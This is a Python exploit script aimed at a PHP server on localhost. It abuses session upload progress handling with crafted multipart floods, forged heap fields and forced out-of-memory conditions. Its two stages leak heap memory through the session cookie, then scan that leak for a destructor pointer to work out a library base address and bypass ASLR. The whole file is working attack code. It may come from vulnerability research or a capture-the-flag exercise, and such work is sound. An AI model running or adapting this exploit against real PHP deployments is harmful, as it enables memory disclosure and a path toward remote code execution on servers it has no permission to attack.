import os
import sys, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie, chunk_base_from_cookie

URL = "http://127.0.0.1:18112/index.php"
dtor_offset = 0x49ec50
SID = b"attacksessionid0001"
t = Target(URL, timeout=120, verbose=False)

def big(): return {"name": "big", "data": b"B" * (12 * 1024 * 1024)}
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              filepart(), big()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def oom():
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              filepart(), big()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

# ===== FULL stage 1 (reqA + reqB with forged field) =====
rotate()
oom()
parts = [{"name": "PHPSESSID", "data": SID},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
raw1 = parse_cookie(resp)
chunk = chunk_base_from_cookie(raw1)
print(f"STAGE1: cookie len={len(raw1)}  chunk_base=0x{chunk:x}")

# ===== stage 2 (reqA + reqB) then DUMP cookie =====
rotate()
oom()
parts = [{"name": "PHPSESSID", "data": SID},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(983):
    cnt = 16 if i == 406 else 1
    for j in range(cnt):
        parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
raw = parse_cookie(resp)
print(f"STAGE2: cookie len={len(raw)}")
if raw:
    print("raw[0:64] hex:", raw[:64].hex())
    want = dtor_offset & 0xFFF
    print(f"scanning for pDestructor (low12={want:#x}) ...")
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000 and (v & 0xFFF) == want:
            base = v - dtor_offset
            print(f"  offset {i:#x}: ptr={v:#x} -> base=0x{base:x} (base&0xFFF={base & 0xFFF:#x})")
    print(f"\nALL {len(raw)//8} qwords + pointers:")
    for i in range(len(raw) // 8):
        v = int.from_bytes(raw[i*8:i*8+8], "little")
        tag = ""
        if 0x700000000000 <= v < 0x800000000000:
            tag = "  <-- PTR"
        print(f"  [{i*8:#x}] {v:#018x}{tag}")
